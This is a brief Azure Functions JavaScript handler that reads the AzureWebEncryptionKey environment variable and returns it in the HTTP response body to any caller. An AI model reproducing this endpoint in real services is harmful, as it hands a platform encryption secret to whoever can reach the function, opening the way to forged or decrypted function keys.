module.exports = async function (context, req) {
    
    // Gets the key from the ENV Vars
    const str = '\{\"AzureWebEncryptionKey\"\:\"' + process.env.AzureWebEncryptionKey + '\"\}';
   
    context.res = {
        // status: 200, /* Defaults to 200 */
        body: str
    };
}